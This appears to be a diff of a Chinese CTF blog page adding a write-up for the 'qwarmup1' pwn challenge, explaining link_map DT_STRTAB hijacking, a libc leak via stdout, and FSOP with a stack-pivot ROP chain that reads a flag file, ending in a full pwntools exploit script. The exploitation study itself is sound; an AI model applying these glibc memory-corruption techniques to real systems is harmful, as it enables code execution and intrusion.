+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">0x556d29202088</span>:	<span class="number">0x00007f9e9d89da20</span>	<span class="number">0x6261747274736873</span></span><br><span class="line"><span class="number">0x556d29202098</span>:	<span class="number">0x707265746e692e00</span>	<span class="number">0x672e65746f6e2e00</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x556d29202088</span> —▸ <span class="number">0x7f9e9d89da20</span> (write) ◂— endbr64 </span><br></pre></td></tr></table></figure>
+<ul>
+<li>我们可以发现 <code>bss-&gt;size</code> &lt; 0x10000，程序循环</li>
+</ul>
+<p>程序循环了，我们可以在 libc 中写入任意数据，不过我们想要泄露 libc_base 需要用到 <code>_dl_fixup_</code> 的机制：</p>
+<ul>
+<li>由于 write 的函数地址没有成功回填到 GOT 表，后面每次调用还会走 symbol 查找流程：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]); <span class="comment">// DT_STRTAB id=5</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (result,sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>_dl_lookup_symbol_x</code> 函数的第一个参数就是待查找函数的函数名，而 <code>sym-&gt;st_name</code> 对于同一个函数而言是一个固定值（“write” = 34） </li>
+<li>而 <code>strtab</code> 则是来源于于 libc 上的全局结构体 <code>link_map</code>，那么可以劫持 <code>link_map-&gt;l_info[DT_STRTAB]</code> ，使其指向可控内存段（比如说：<code>link_map-&gt;l_info[DT_DEBUG]</code>），达到任意函数调用</li>
+</ul>
+<p><code>DT_STRTAB</code> 在 elf 中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到 <code>DT_DEBUG</code> 这个表是指向 libc 地址，可以通过改写最低位：</p>
+<ul>
+<li>把 <code>link_map-&gt;l_info[DT_DEBUG]</code> 低位覆盖为 <code>link_map-&gt;l_info[DT_STRTAB]</code> 这样程序就会误以为 <code>DT_DEBUG</code> 是 <code>DT_STRTAB</code>（这下放入 <code>_dl_lookup_symbol_x</code> 的第二个参数就会变成 <code>DT_DEBUG</code>）</li>
+<li>于是我们提前在 <code>DT_DEBUG+34</code>（原来是 <code>DT_STRTAB+34</code>）的位置写上 <code>[function_name]</code>，就可以达到任意函数调用</li>
+</ul>
+<p>我们可以利用这个机制来 leak libc_base，示例代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0xf4000</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0xfbad1800</span>))</span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x28</span>,<span class="string">b&#x27;\xff&#x27;</span>) </span><br><span class="line"></span><br><span class="line">r_debug_offset = <span class="number">0x359118</span>-<span class="number">0x10</span></span><br><span class="line">write(r_debug_offset+<span class="number">34</span>,<span class="string">b&quot;_IO_flush_all&quot;</span>) </span><br><span class="line"></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ba70</span> </span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
+<ul>
+<li>思路还是和上面的一样，只是执行的函数为 <code>_IO_flush_all</code></li>
+<li>于是我们在 <code>_IO_2_1_stdout_</code> 中修改 FILE 结构体的条目，经过如下调用链后泄露 libc_base：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup -&gt; _dl_lookup_symbol_x -&gt; _IO_flush_all</span><br></pre></td></tr></table></figure>
+<p>最后用同样的方法执行 FSOP，使用 <code>_IO_wdefault_xsgetn</code> 的调用链：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all -&gt; _IO_flush_all_lockp -&gt; _IO_wdefault_xsgetn -&gt; _IO_switch_to_wget_mode</span><br></pre></td></tr></table></figure>
+<p>示例代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x78&#x27;</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP(_IO_flush_all_lockp --&gt; IO_jump_t.__overflow)</span></span><br><span class="line">heap_addr = libc.address - (<span class="number">0xf4000</span> - <span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _IO_2_1_stdout_</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0x800</span>)) <span class="comment"># flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xc0</span>,p8(<span class="number">0xff</span>)) <span class="comment"># _mode &gt; 1</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x48</span>,p64(heap_addr)) <span class="comment"># _IO_save_base(rdi+0x48)</span></span><br><span class="line">_IO_wstrn_jumps = libc.address + <span class="number">0x215dc0</span> <span class="comment"># vtable(_IO_wstrn_jumps)</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xd8</span>,p64(_IO_wstrn_jumps+<span class="number">0x28</span>)) <span class="comment"># _IO_wstrn_overflow-&gt;_IO_wdefault_xsgetn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _wide_data</span></span><br><span class="line"><span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_wide_data_1_offset = <span class="number">0x30d9a0</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0x20</span>,p8(<span class="number">0x1</span>))</span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0xe0</span>,p64(heap_addr+<span class="number">0x110</span>-<span class="number">0x18</span>)) <span class="comment"># vtable(fake)</span></span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    [<span class="string">b&#x27;./flag\x00\x00&#x27;</span>, pop_r12_r13_r14_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, heap_addr - <span class="number">8</span>],</span><br><span class="line">    [leave_ret, pop_rdx_r12_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>,<span class="number">0xdeadbeef</span>],</span><br><span class="line">    [pop_rdi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rsi_ret, <span class="number">0</span>],</span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, pop_rax_ret],</span><br><span class="line">    [<span class="number">2</span>, syscall_ret], <span class="comment"># open(&#x27;/flag&#x27;,0,0)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">3</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, read_addr], <span class="comment"># read(3,&amp;buf,0x40)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">1</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, write_addr], <span class="comment"># write(1,&amp;buf,0x40)</span></span><br><span class="line">    svcudp_reply26</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,rop)</span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>先还原 <code>DT_STRTAB</code></li>
+<li>修改 <code>_IO_2_1_stdout_ FILE</code> 结构体，利用 vtable 偏移的思想实现 vtable 任意函数调用（<code>_IO_flush_all_lockp</code> 原本会调用 <code>_IO_wstrn_overflow</code> ，修改 vtable 偏移后变为调用 <code>_IO_wdefault_xsgetn</code>）</li>
+<li>然后在 <code>_IO_wide_data_1</code> 中伪造数据：<ul>
+<li><code>_IO_wide_data_1+0x20</code> -&gt; [RDX]</li>
+<li><code>_IO_wide_data_1+0xe0</code> -&gt; [RAX]</li>
+</ul>
+</li>
+<li>我们可以控制 [RAX]，并且在 [RAX+0x18] 中提前写入 ROP 的地址</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x7f8099bc0108</span> ◂— <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"> RDI  <span class="number">0x7f8099ece780</span> (_IO_2_1_stdout_) ◂— <span class="number">0x800</span></span><br><span class="line"> RDX  <span class="number">0x1</span></span><br><span class="line">*RIP  <span class="number">0x7f8099d37d55</span> (_IO_switch_to_wget_mode+<span class="number">37</span>) ◂— call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8099bc0108</span>+<span class="number">0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8099bc0120</span> —▸ <span class="number">0x7f8099e1e1fa</span> (svcudp_reply+<span class="number">26</span>) ◂— mov    rbp, qword ptr [rdi + <span class="number">0x48</span>] <span class="comment">/* ROP */</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>gadget svcudp_reply 可以控制会 [RBP] 为 [RDI+0x48]（我们提前在 <code>_IO_2_1_stdout_ +0x48</code> 中伪造好 ROP_addr），同时会 call [RAX+0x28]，在这里放入 <code>leave ret</code> 就利用控制栈了</li>
+</ul>
+<p>完整 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./qwarmup1&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory /home/yhellow/tools/debuglibc/2.35-0ubuntu3_amd64/usr/lib/debug/\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14A7)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14D1)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14BB)\n&quot;</span></span><br><span class="line"></span><br><span class="line">p = gdb.debug(<span class="string">&quot;./qwarmup1&quot;</span>,cmd)</span><br><span class="line"><span class="comment">#p = process(&quot;./qwarmup1&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1491)\n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset, <span class="built_in">bytes</span>, tag=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">bytes</span>):</span><br><span class="line">        p.send(p64(offset + i))</span><br><span class="line">        p.send(p8(byte))</span><br><span class="line">        <span class="keyword">if</span> tag:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;Success!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(p32(<span class="number">0xf0000</span>))</span><br><span class="line">size_addr = <span class="number">0x408c</span></span><br><span class="line">link_map_offset = <span class="number">0x3592e0</span>-<span class="number">0x10</span></span><br><span class="line">write(link_map_offset, p8(size_addr-<span class="number">4</span> - elf.got[<span class="string">&quot;write&quot;</span>])) <span class="comment"># overwrite &amp;size-4 = write@libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0xf4000</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0xfbad1800</span>)) <span class="comment"># _flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x28</span>,<span class="string">b&#x27;\xff&#x27;</span>) </span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_offset))</span><br><span class="line"></span><br><span class="line">r_debug_offset = <span class="number">0x359118</span>-<span class="number">0x10</span></span><br><span class="line">write(r_debug_offset+<span class="number">34</span>,<span class="string">b&quot;_IO_flush_all&quot;</span>) <span class="comment"># DT_STRTAB+34 = write =&gt; DT_DEBUG+34 = call_func</span></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ba70</span> </span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x78&#x27;</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP(_IO_flush_all_lockp --&gt; IO_jump_t.__overflow)</span></span><br><span class="line">heap_addr = libc.address - (<span class="number">0xf4000</span> - <span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _IO_2_1_stdout_</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0x800</span>)) <span class="comment"># flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xc0</span>,p8(<span class="number">0xff</span>)) <span class="comment"># _mode &gt; 1</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x48</span>,p64(heap_addr)) <span class="comment"># _IO_save_base(rdi)</span></span><br><span class="line">_IO_wstrn_jumps = libc.address + <span class="number">0x215dc0</span> <span class="comment"># vtable(_IO_wstrn_jumps)</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xd8</span>,p64(_IO_wstrn_jumps+<span class="number">0x28</span>)) <span class="comment"># _IO_wstrn_overflow-&gt;_IO_wdefault_xsgetn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _wide_data</span></span><br><span class="line"><span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_wide_data_1_offset = <span class="number">0x30d9a0</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0x20</span>,p8(<span class="number">0x2</span>))</span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0xe0</span>,p64(heap_addr+<span class="number">0x110</span>-<span class="number">0x18</span>)) <span class="comment"># vtable(fake)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP</span></span><br><span class="line">svcudp_reply26 = libc.address + <span class="number">0x16a1fa</span></span><br><span class="line">pop_r12_r13_r14_ret = libc.address + <span class="number">0x000000000002be4c</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc.address + <span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret = libc.address + <span class="number">0x0000000000045eb0</span></span><br><span class="line">leave_ret = libc.address + <span class="number">0x00000000000562ec</span></span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall_ret = libc.address + <span class="number">0x91396</span></span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    [<span class="string">b&#x27;./flag\x00\x00&#x27;</span>, pop_r12_r13_r14_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, heap_addr - <span class="number">8</span>],</span><br><span class="line">    [leave_ret, pop_rdx_r12_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>,<span class="number">0xdeadbeef</span>],</span><br><span class="line">    [pop_rdi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rsi_ret, <span class="number">0</span>],</span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, pop_rax_ret],</span><br><span class="line">    [<span class="number">2</span>, syscall_ret], <span class="comment"># open(&#x27;/flag&#x27;,0,0)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">3</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, read_addr], <span class="comment"># read(3,&amp;buf,0x40)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">1</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, write_addr], <span class="comment"># write(1,&amp;buf,0x40)</span></span><br><span class="line">    svcudp_reply26</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,rop)</span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>小结：</strong></p>
+<ul>
+<li>复习了一下 <code>_dl_runtime_resolve</code> 的知识</li>
+<li>也认识了一个可以控制栈的 gadget（svcudp_reply+26）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f78243fb1fa</span> &lt;svcudp_reply+<span class="number">26</span>&gt;:    mov    rbp,QWORD PTR [rdi+<span class="number">0x48</span>]  </span><br><span class="line"><span class="number">0x7f78243fb1fe</span> &lt;svcudp_reply+<span class="number">30</span>&gt;:    mov    rax,QWORD PTR [rbp+<span class="number">0x18</span>]  </span><br><span class="line"><span class="number">0x7f78243fb202</span> &lt;svcudp_reply+<span class="number">34</span>&gt;:    lea    r13,[rbp+<span class="number">0x10</span>]             </span><br><span class="line"><span class="number">0x7f78243fb206</span> &lt;svcudp_reply+<span class="number">38</span>&gt;:    mov    DWORD PTR [rbp+<span class="number">0x10</span>],<span class="number">0x0</span>   </span><br><span class="line"><span class="number">0x7f78243fb20d</span> &lt;svcudp_reply+<span class="number">45</span>&gt;:    mov    rdi,r13                    </span><br><span class="line"><span class="number">0x7f78243fb210</span> &lt;svcudp_reply+<span class="number">48</span>&gt;:    call   QWORD PTR [rax+<span class="number">0x28</span>]</span><br><span class="line">    <span class="comment">/* [rdi+0x48]中被放入ROP_addr */</span></span><br><span class="line">    <span class="comment">/* [rax+0x28]中被放入&#x27;leave ret&#x27; */</span></span><br></pre></td></tr></table></figure>
+<p>由于 <code>_IO_switch_to_wget_mode</code> 可以控制 [RDX]，我们可以考虑用 <code>setcontext+61</code> 来控制栈，我这里就不演示了</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2223,135 +2504,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/08/House%20Of%20Cat-%E5%8E%9F%E7%90%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/08/House%20Of%20Cat-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Cat-原理</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-08-08 14:50:55" itemprop="dateCreated datePublished" datetime="2022-08-08T14:50:55+08:00">2022-08-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-08-10 15:10:53" itemprop="dateModified" datetime="2022-08-10T15:10:53+08:00">2022-08-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>4.7k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>4 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
